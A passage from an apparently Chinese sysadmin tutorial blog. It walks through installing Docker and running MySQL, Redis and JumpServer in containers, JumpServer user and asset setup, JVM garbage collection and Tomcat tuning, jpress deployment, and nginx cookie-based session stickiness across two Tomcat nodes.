class="hljs-built_in">sleep</span> 5<br>        apt -y  install docker-ce=<span class="hljs-variable">$&#123;UBUNTU_DOCKER_VERSION&#125;</span> docker-ce-cli=<span class="hljs-variable">$&#123;UBUNTU_DOCKER_VERSION&#125;</span><br>    <span class="hljs-keyword">fi</span><br>    <span class="hljs-keyword">if</span> [ $? -eq 0 ];<span class="hljs-keyword">then</span><br>        color <span class="hljs-string">&quot;安装软件包成功&quot;</span>  0<br>    <span class="hljs-keyword">else</span><br>        color <span class="hljs-string">&quot;安装软件包失败，请检查网络配置&quot;</span> 1<br>        <span class="hljs-built_in">exit</span><br>    <span class="hljs-keyword">fi</span><br>        <br>&#125;<br><br><span class="hljs-function"><span class="hljs-title">config_docker</span></span> ()&#123;<br>    <span class="hljs-built_in">mkdir</span> -p /etc/docker<br>    <span class="hljs-built_in">tee</span> /etc/docker/daemon.json &lt;&lt;-<span class="hljs-string">&#x27;EOF&#x27;</span><br>&#123;<br>  <span class="hljs-string">&quot;registry-mirrors&quot;</span>: [<span class="hljs-string">&quot;https://si7y70hh.mirror.aliyuncs.com&quot;</span>],<br>  <span class="hljs-string">&quot;insecure-registries&quot;</span>:[<span class="hljs-string">&quot;harbor.magedu.org:80&quot;</span>]<br>&#125;<br>EOF<br>    systemctl daemon-reload<br>    systemctl <span class="hljs-built_in">enable</span> docker<br>    systemctl restart docker<br>    docker version &amp;&amp; color <span class="hljs-string">&quot;Docker 安装成功&quot;</span> 0 ||  color <span class="hljs-string">&quot;Docker 安装失败&quot;</span> 1<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-title">set_alias</span></span> ()&#123;<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;alias rmi=&quot;docker images -qa|xargs docker rmi -f&quot;&#x27;</span> &gt;&gt; ~/.bashrc<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;alias rmc=&quot;docker ps -qa|xargs docker rm -f&quot;&#x27;</span> &gt;&gt; ~/.bashrc<br>&#125;<br><br><br>install_docker<br>config_docker <br>set_alias<br></code></pre></td></tr></table></figure><h4 id="（2）安装-Mysql-环境"><a href="#（2）安装-Mysql-环境" class="headerlink" title="（2）安装 Mysql 环境"></a>（2）安装 Mysql 环境</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> -p /etc/mysql/mysql.conf.d/<br><span class="hljs-built_in">mkdir</span> -p /etc/mysql/conf.d/<br><br><span class="hljs-comment">#生成服务器配置文件,指定字符集</span><br><span class="hljs-built_in">tee</span> /etc/mysql/mysql.conf.d/mysqld.cnf &lt;&lt;<span class="hljs-string">EOF</span><br><span class="hljs-string">[mysqld]</span><br><span class="hljs-string">pid-file= /var/run/mysqld/mysqld.pid</span><br><span class="hljs-string">socket= /var/run/mysqld/mysqld.sock</span><br><span class="hljs-string">datadir= /var/lib/mysql</span><br><span class="hljs-string">symbolic-links=0</span><br><span class="hljs-string">character-set-server=utf8</span><br><span class="hljs-string">EOF</span><br><br><span class="hljs-comment">#生成客户端配置文件,指定字符集</span><br><span class="hljs-built_in">tee</span> /etc/mysql/conf.d/mysql.cnf &lt;&lt;<span class="hljs-string">EOF</span><br><span class="hljs-string">[mysql]</span><br><span class="hljs-string">default-character-set=utf8</span><br><span class="hljs-string">EOF</span><br><br><br>docker run -d -p 3306:3306 --name mysql --restart always \<br>-e MYSQL_ROOT_PASSWORD=123456 \<br>-e MYSQL_DATABASE=jumpserver  \<br>-e MYSQL_USER=jumpserver      \<br>-e MYSQL_PASSWORD=123456       \<br>-v /data/mysql:/var/lib/mysql   \<br>-v /etc/mysql/mysql.conf.d/mysqld.cnf:/etc/mysql/mysql.conf.d/mysqld.cnf  \<br>-v /etc/mysql/conf.d/mysql.cnf:/etc/mysql/conf.d/mysql.cnf   mysql:5.7.30<br></code></pre></td></tr></table></figure><h4 id="（3）安装-Redis-环境"><a href="#（3）安装-Redis-环境" class="headerlink" title="（3）安装 Redis 环境"></a>（3）安装 Redis 环境</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker run -d -p 6379:6379 --name redis --restart always  redis<br></code></pre></td></tr></table></figure><h4 id="（4）生成-key-和-token"><a href="#（4）生成-key-和-token" class="headerlink" title="（4）生成 key 和 token"></a>（4）生成 key 和 token</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#此脚本由官方提供，而后做了一些修改</span><br>[root@JumpServer ~]<span class="hljs-comment"># cat key.sh</span><br><span class="hljs-comment">#!/bin/bash</span><br><br><span class="hljs-keyword">if</span> [ ! <span class="hljs-string">&quot;<span class="hljs-variable">$SECRET_KEY</span>&quot;</span> ]; <span class="hljs-keyword">then</span><br>  SECRET_KEY=`<span class="hljs-built_in">cat</span> /dev/urandom | <span class="hljs-built_in">tr</span> -dc A-Za-z0-9 | <span class="hljs-built_in">head</span> -c 50`;<br>  <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;SECRET_KEY=<span class="hljs-variable">$SECRET_KEY</span>&quot;</span> &gt;&gt; ~/.bashrc;<br>  <span class="hljs-built_in">echo</span> SECRET_KEY=<span class="hljs-variable">$SECRET_KEY</span>;<br><span class="hljs-keyword">else</span><br>  <span class="hljs-built_in">echo</span> SECRET_KEY=<span class="hljs-variable">$SECRET_KEY</span>;<br><span class="hljs-keyword">fi</span><br><span class="hljs-keyword">if</span> [ ! <span class="hljs-string">&quot;<span class="hljs-variable">$BOOTSTRAP_TOKEN</span>&quot;</span> ]; <span class="hljs-keyword">then</span><br>  BOOTSTRAP_TOKEN=`<span class="hljs-built_in">cat</span> /dev/urandom | <span class="hljs-built_in">tr</span> -dc A-Za-z0-9 | <span class="hljs-built_in">head</span> -c 16`;<br>  <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;BOOTSTRAP_TOKEN=<span class="hljs-variable">$BOOTSTRAP_TOKEN</span>&quot;</span> &gt;&gt; ~/.bashrc;<br>  <span class="hljs-built_in">echo</span> BOOTSTRAP_TOKEN=<span class="hljs-variable">$BOOTSTRAP_TOKEN</span>;<br><span class="hljs-keyword">else</span><br>  <span class="hljs-built_in">echo</span> BOOTSTRAP_TOKEN=<span class="hljs-variable">$BOOTSTRAP_TOKEN</span>;<br><span class="hljs-keyword">fi</span><br><br>[root@JumpServer ~]<span class="hljs-comment"># tail -n2 .bashrc</span><br>SECRET_KEY=UF9v8atjcC6ljiotDYljdGr2FR7stCaEWBLrX5bmdrYQbf6CJP<br>BOOTSTRAP_TOKEN=d4MgiDYZXCflicO4<br></code></pre></td></tr></table></figure><h4 id="（5）运行Jumpserver"><a href="#（5）运行Jumpserver" class="headerlink" title="（5）运行Jumpserver"></a>（5）运行Jumpserver</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#修改SECRET_KEY和BOOTSTRAP_TOKEN</span><br><span class="hljs-comment">#修改DB_HOST和REDIS_HOST，写127.0.0.1会失败！</span><br>docker run --name jms_all -d \<br>  -v /opt/jumpserver/core/data:/opt/jumpserver/data \<br>  -v /opt/jumpserver/koko/data:/opt/koko/data \<br>  -v /opt/jumpserver/lion/data:/opt/lion/data \<br>  -p 80:80 \<br>  -p 2222:2222 \<br>  -e SECRET_KEY=UF9v8atjcC6ljiotDYljdGr2FR7stCaEWBLrX5bmdrYQbf6CJP \<br>  -e BOOTSTRAP_TOKEN=d4MgiDYZXCflicO4 \<br>  -e LOG_LEVEL=ERROR \<br>  -e DB_HOST=10.0.0.40 \<br>  -e DB_PORT=3306 \<br>  -e DB_USER=jumpserver \<br>  -e DB_PASSWORD=123456 \<br>  -e DB_NAME=jumpserver \<br>  -e REDIS_HOST=10.0.0.40 \<br>  -e REDIS_PORT=6379 \<br>  -e REDIS_PASSWORD=<span class="hljs-string">&#x27;&#x27;</span> \<br>  --privileged=<span class="hljs-literal">true</span> \<br>  jumpserver/jms_all<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@JumpServer ~]<span class="hljs-comment"># ss -ntl</span><br>State      Recv-Q     Send-Q         Local Address:Port         Peer Address:Port    Process<br>LISTEN     0          128                  0.0.0.0:3306              0.0.0.0:*<br>LISTEN     0          128                  0.0.0.0:6379              0.0.0.0:*<br>LISTEN     0          128                  0.0.0.0:2222              0.0.0.0:*<br>LISTEN     0          128                  0.0.0.0:80                0.0.0.0:*<br>LISTEN     0          128                  0.0.0.0:22                0.0.0.0:*<br>LISTEN     0          128                     [::]:3306                 [::]:*<br>LISTEN     0          128                     [::]:6379                 [::]:*<br>LISTEN     0          128                     [::]:2222                 [::]:*<br>LISTEN     0          128                     [::]:80                   [::]:*<br>LISTEN     0          128                     [::]:22                   [::]:*<br></code></pre></td></tr></table></figure><h3 id="2-添加用户授权，行为审计"><a href="#2-添加用户授权，行为审计" class="headerlink" title="2 添加用户授权，行为审计"></a>2 添加用户授权，行为审计</h3><h4 id="（1）登录"><a href="#（1）登录" class="headerlink" title="（1）登录"></a>（1）登录</h4><p> <a href="https://img2023.cnblogs.com/blog/2927659/202212/2927659-20221226233241638-584434508.png"><img src="2927659-20221226233241638-584434508.png" alt="img"></a></p><h4 id="（2）创建用户组和用户"><a href="#（2）创建用户组和用户" class="headerlink" title="（2）创建用户组和用户"></a>（2）创建用户组和用户</h4><p><a href="https://img2023.cnblogs.com/blog/2927659/202212/2927659-20221226234415663-672090096.png"><img src="2927659-20221226234415663-672090096.png" alt="img"></a></p><h4 id="（3）创建普通用户和特权用户"><a href="#（3）创建普通用户和特权用户" class="headerlink" title="（3）创建普通用户和特权用户"></a>（3）创建普通用户和特权用户</h4><blockquote><p>普通用户选择自动推送或手动进Linux创建此账号</p><p>特权用户是后端真实root的账号密码</p></blockquote><p><a href="https://img2023.cnblogs.com/blog/2927659/202212/2927659-20221227001352871-295076515.png"><img src="2927659-20221227001352871-295076515.png" alt="img"></a></p><h4 id="（4）创建资产"><a href="#（4）创建资产" class="headerlink" title="（4）创建资产"></a>（4）创建资产</h4><blockquote><p>需要选择刚才创建的特权用户</p></blockquote><p><a href="https://img2023.cnblogs.com/blog/2927659/202212/2927659-20221227001406897-1845489867.png"><img src="2927659-20221227001406897-1845489867.png" alt="img"></a></p><h4 id="（5）资产授权"><a href="#（5）资产授权" class="headerlink" title="（5）资产授权"></a>（5）资产授权</h4><p><a href="https://img2023.cnblogs.com/blog/2927659/202212/2927659-20221227001419884-605029264.png"><img src="2927659-20221227001419884-605029264.png" alt="img"></a></p><h4 id="（6）用户登录"><a href="#（6）用户登录" class="headerlink" title="（6）用户登录"></a>（6）用户登录</h4><p><a href="https://img2023.cnblogs.com/blog/2927659/202212/2927659-20221227000932307-568219458.png"><img src="2927659-20221227000932307-568219458.png" alt="img"></a></p><h4 id="（7）审计用户登录"><a href="#（7）审计用户登录" class="headerlink" title="（7）审计用户登录"></a>（7）审计用户登录</h4><p><a href="https://img2023.cnblogs.com/blog/2927659/202212/2927659-20221227001302986-1671579476.png"><img src="2927659-20221227001302986-1671579476.png" alt="img"></a></p><h2 id="-5"><a href="#-5" class="headerlink" title=""></a></h2><hr><h2 id="七、JVM垃圾回收原理，JVM调优"><a href="#七、JVM垃圾回收原理，JVM调优" class="headerlink" title="七、JVM垃圾回收原理，JVM调优"></a>七、JVM垃圾回收原理，JVM调优</h2><h3 id="（1）JVM垃圾回收原理"><a href="#（1）JVM垃圾回收原理" class="headerlink" title="（1）JVM垃圾回收原理"></a>（1）JVM垃圾回收原理</h3><blockquote><p>Java虚拟机（JVM）的垃圾回收（GC）是一种自动内存管理机制，它的目的是回收不再使用的内存，以便重新利用这些内存来分配新的对象。这样可以减少内存泄漏和内存溢出的风险，并保证程序的正常运行。</p></blockquote><blockquote><p>JVM垃圾回收过程分为两个阶段：标记和清除。在标记阶段，JVM扫描内存中的所有对象，并标记出那些可以被回收的对象。在清除阶段，JVM清除所有被标记的对象，并释放它们占用的内存。</p></blockquote><blockquote><p>JVM使用多种算法来执行垃圾回收，其中包括标记-清除算法、复制算法和分代回收算法。</p><p>标记-清除算法是最常见的垃圾回收算法。它的工作流程如下：</p><ol><li>标记：扫描内存中的所有对象，并标记出那些可以被回收的对象。</li><li>清除：清除所有被标记的对象，并释放它们占用的内存。</li><li>整理：整理内存空间，使空闲内存形成连续的块。</li></ol><p>复制算法是一种改进的垃圾回收算法，它的工作流程如下：</p><ol><li>将内存分成两块，每次只使用其中一块。</li><li>将所有存活的对象复制到另一块内存中。</li><li>释放原来使用的内存块。</li></ol><p>复制算法的优点是，因为每次只需要处理存活的对象，所以效率较高，且不需要进行内存整理。但是，它的缺点是需要额外的内存空间来存储复制后的对象，因此可用内存空间会减半。</p><p>分代回收算法是一种改进的垃圾回收算法，它将内存分为新生代和老年代。新生代内存中存储的是新创建的对象，老年代内存中存储的是存活时间较长的对象。</p><p>分代回收算法的工作流程如下：</p><ol><li>对新生代进行复制算法回收，回收那些已死亡的对象。</li><li>将存活的对象复制到老年代。</li><li>对老年代进行标记-清除或其他算法回收，回收那些已死亡的对象。</li></ol><p>分代回收算法的优点是可以更高效地回收内存，因为新生代中的对象死亡率较高，所以使用复制算法效率较高。而老年代中的对象死亡率较低，所以使用标记-清除或其他算法效率较高。</p></blockquote><blockquote><p>总的来说，JVM垃圾回收是一种非常重要的机制，它可以帮助我们自动管理内存，减少内存泄漏和内存溢出的风险，并保证程序的正常运行。但是，垃圾回收也有一定的开销，因此我们在编写代码时也要注意避免不必要的内存分配。</p></blockquote><h3 id="（2）JVM调优"><a href="#（2）JVM调优" class="headerlink" title="（2）JVM调优"></a>（2）JVM调优</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">1、java -<span class="hljs-built_in">cp</span> . -Xms512m -Xmx1g jpress <span class="hljs-comment">#指定java允许的初始内存和总内存都为512M允许jpress程序</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">2、JAVA_OPTS=<span class="hljs-string">&quot;-server -Xms4g -Xmx4g -XX:NewSize= -XX:MaxNewSize= &quot;</span><br>-server：服务器模式<br>-Xms：堆内存初始化大小<br>-Xmx：堆内存空间上限<br>-XX:NewSize=：新生代空间初始化大小<br>-XX:MaxNewSize=：新生代空间最大值<br>例：tomcat的catalina.sh里添加一行 JAVA_OPTS=<span class="hljs-string">&quot;-server -Xms128m -Xmx512m -XX:NewSize=48m -XX:MaxNewSize=200m&quot;</span><br><br><span class="hljs-comment">#运行在server模式初始内存128M,最大内存512M,设置初始新生代大小为48M,设置最大新生代内存空间200M。</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">3、线程池调整<br><br><span class="hljs-comment">#vim /usr/local/tomcat/conf/server.xml</span><br>......<br>&lt;Connector port=<span class="hljs-string">&quot;8080&quot;</span> protocol=<span class="hljs-string">&quot;HTTP/1.1&quot;</span> connectionTimeout=<span class="hljs-string">&quot;20000&quot;</span> redirectPort=<span class="hljs-string">&quot;8443&quot;</span> maxThreads=<span class="hljs-string">&quot;2000&quot;</span>/&gt;<br><br>connectionTimeout ：连接超时时长,单位ms<br>maxThreads：最大线程数，默认200,也就是我们常说的并发连接数<br>minSpareThreads：最小空闲线程数<br>maxSpareThreads：最大空闲线程数<br>acceptCount：当启动线程满了之后，等待队列的最大长度，默认100<br>URIEncoding：URI 地址编码格式，建议使用 UTF-8<br>enableLookups：是否启用客户端主机名的DNS反向解析，缺省禁用，建议禁用，就使用客户端IP就行<br>compression：是否启用传输压缩机制，建议 <span class="hljs-string">&quot;on&quot;</span>，CPU和流量的平衡<br>compressionMinSize：启用压缩传输的数据流最小值，单位是字节<br>compressableMimeType：定义启用压缩功能的MIME类型text/html, text/xml, text/css,text/javascript<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">4、指定垃圾回收器--适合响应时间短、交互式的网站，提高用户体验<br><br><span class="hljs-comment">#将参数加入到bin/catalina.sh中，重启观察Tomcat status。老年代已经使用CMS</span><br>[root@tomcat ~]<span class="hljs-comment">#vim /usr/local/tomcat/bin/catalina.sh</span><br>......<br><span class="hljs-comment"># OS specific support. $var _must_ be set to either true or false.</span><br>JAVA_OPTS=<span class="hljs-string">&quot;-server -Xmx512m -Xms128m -XX:NewSize=48m -XX:MaxNewSize=200m -XX:+UseConcMarkSweepGC -XX:+UseCMSCompactAtFullCollection -XX:CMSFullGCsBeforeCompaction=5&quot;</span><br></code></pre></td></tr></table></figure><h2 id="-6"><a href="#-6" class="headerlink" title=""></a></h2><hr><h2 id="八、tomcat实现java应用发布"><a href="#八、tomcat实现java应用发布" class="headerlink" title="八、tomcat实现java应用发布"></a>八、tomcat实现java应用发布</h2><h3 id="（1）安装java"><a href="#（1）安装java" class="headerlink" title="（1）安装java"></a>（1）安装java</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@blog ~]<span class="hljs-comment"># yum install -y java</span><br></code></pre></td></tr></table></figure><h3 id="（2）安装tomcat"><a href="#（2）安装tomcat" class="headerlink" title="（2）安装tomcat"></a>（2）安装tomcat</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@blog ~]<span class="hljs-comment"># yum install -y tomcat</span><br>[root@blog ~]<span class="hljs-comment"># systemctl enable --now tomcat</span><br></code></pre></td></tr></table></figure><h3 id="（3）jpress"><a href="#（3）jpress" class="headerlink" title="（3）jpress"></a>（3）jpress</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#注：war名叫什么，访问的网站名就叫什么</span><br><span class="hljs-comment">#war包放到webapps下会自动解压</span><br>[root@blog ~]<span class="hljs-comment"># mv jpress-v4.0.7.war blog.war</span><br>[root@blog ~]<span class="hljs-comment"># mv blog.war /usr/share/tomcat/webapps</span><br></code></pre></td></tr></table></figure><p><a href="https://img2023.cnblogs.com/blog/2927659/202212/2927659-20221228191241127-1097389404.png"><img src="2927659-20221228191241127-1097389404.png" alt="img"></a></p><h2 id="-7"><a href="#-7" class="headerlink" title=""></a></h2><hr><h2 id="九、实现tomcat-session粘性，并验证过程"><a href="#九、实现tomcat-session粘性，并验证过程" class="headerlink" title="九、实现tomcat session粘性，并验证过程"></a>九、实现tomcat session粘性，并验证过程</h2><blockquote><p><strong>环境：</strong></p><p>dns：10.0.0.20</p><p>nginx：10.0.0.30</p><p>tomcat1：10.0.0.40</p><p>tomcat2：10.0.0.50</p></blockquote><h3 id="（1）dns配置"><a href="#（1）dns配置" class="headerlink" title="（1）dns配置"></a>（1）dns配置</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#增加下面一段</span><br>[root@dns ~]<span class="hljs-comment"># cat /etc/named.rfc1912.zones</span><br>zone <span class="hljs-string">&quot;willoneday.org&quot;</span> IN &#123;<br>    <span class="hljs-built_in">type</span> master;<br>    file  <span class="hljs-string">&quot;willoneday.org.zone&quot;</span>;<br>&#125;;<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#www指向nginx服务器ip地址</span><br>[root@dns ~]<span class="hljs-comment"># vim /var/named/willoneday.org.zone</span><br><span class="hljs-variable">$TTL</span> 1D<br>@IN SOAmaster admin (<br>1; serial<br>1D; refresh<br>1H; retry<br>1W; expire<br>3H ); minimum<br>        NS master<br>master      A    10.0.0.20<br>www         A    10.0.0.30<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@dns ~]<span class="hljs-comment"># rndc reload</span><br></code></pre></td></tr></table></figure><h3 id="（2）nginx配置"><a href="#（2）nginx配置" class="headerlink" title="（2）nginx配置"></a>（2）nginx配置</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@nginx ~]<span class="hljs-comment"># vim /apps/nginx/conf/nginx.conf</span><br>http &#123;<br>    ...省略...<br>    upstream tomcat-server &#123;<br>        <span class="hljs-comment">#ip_hash;                #启动源地址hash</span><br>        <span class="hljs-built_in">hash</span> <span class="hljs-variable">$cookie_JSESSIONID</span>; <span class="hljs-comment">#启动基于cookie的hash</span><br>        server 10.0.0.40:8080;   <span class="hljs-comment">#可加weight（权重）等</span><br>        server 10.0.0.50:8080;<br>    &#125;<br><br>    server &#123;<br>        listen       80;<br>        server_name  localhost;<br><br>        <span class="hljs-comment">#charset koi8-r;</span><br><br>        <span class="hljs-comment">#access_log  logs/host.access.log  main;</span><br><br>        location / &#123;<br>            root   html;<br>            index  index.html index.htm;<br>            proxy_pass http://tomcat-server;<br>            proxy_set_header Host <span class="hljs-variable">$http_host</span>;<br>        &#125;<br>    ...省略...<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@nginx ~]<span class="hljs-comment"># nginx -s reload</span><br></code></pre></td></tr></table></figure><h3 id="（3）tomcat1配置"><a href="#（3）tomcat1配置" class="headerlink" title="（3）tomcat1配置"></a>（3）tomcat1配置</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#增加一个Host</span><br>[root@tomcat1 ~]<span class="hljs-comment"># vim /usr/local/tomcat/conf/server.xml</span><br>    &lt;Host name=<span class="hljs-string">&quot;www.willoneday.org&quot;</span>  appBase=<span class="hljs-string">&quot;/data/tomcat/node1&quot;</span><br>            unpackWARs=<span class="hljs-string">&quot;true&quot;</span> autoDeploy=<span class="hljs-string">&quot;true&quot;</span>&gt;<br>    &lt;/Host&gt;<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#创建携带session的测试页面</span><br>[root@tomcat1 ~]<span class="hljs-comment"># mkdir -p /data/tomcat/node1/ROOT/</span><br>[root@tomcat1 ~]<span class="hljs-comment"># vim /data/tomcat/node1/ROOT/index.jsp</span><br>&lt;%@ page import=<span class="hljs-string">&quot;java.util.*&quot;</span> %&gt;<br>&lt;!DOCTYPE html&gt;<br>&lt;html lang=<span class="hljs-string">&quot;en&quot;</span>&gt;<br>&lt;<span class="hljs-built_in">head</span>&gt;<br>    &lt;meta charset=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;<br>    &lt;title&gt;tomcat <span class="hljs-built_in">test</span>&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1&gt; Tomcat Website1 &lt;/h1&gt;<br>&lt;div&gt;On  &lt;%=request.getServerName() %&gt;&lt;/div&gt;<br>&lt;div&gt;&lt;%=request.getLocalAddr() + <span class="hljs-string">&quot;:&quot;</span> + request.getLocalPort() %&gt;&lt;/div&gt;<br>&lt;div&gt;SessionID = &lt;span style=<span class="hljs-string">&quot;color:blue&quot;</span>&gt;&lt;%=session.getId() %&gt;&lt;/span&gt;&lt;/div&gt;<br>&lt;%=new Date()%&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#重启生效</span><br>[root@tomcat1 ~]<span class="hljs-comment"># systemctl restart tomcat</span><br></code></pre></td></tr></table></figure><h3 id="（4）tomcat2配置"><a href="#（4）tomcat2配置" class="headerlink" title="（4）tomcat2配置"></a>（4）tomcat2配置</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#增加一个Host</span><br>[root@tomcat2 ~]<span class="hljs-comment"># vim /usr/local/tomcat/conf/server.xml</span><br>    &lt;Host name=<span class="hljs-string">&quot;www.willoneday.org&quot;</span>  appBase=<span class="hljs-string">&quot;/data/tomcat/node2&quot;</span><br>            unpackWARs=<span class="hljs-string">&quot;true&quot;</span> autoDeploy=<span class="hljs-string">&quot;true&quot;</span>&gt;<br>    &lt;/Host&gt;<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#创建携带session的测试页面</span><br>[root@tomcat2 ~]<span class="hljs-comment"># mkdir -p /data/tomcat/node2/ROOT/</span><br>[root@tomcat2 ~]<span class="hljs-comment"># vim 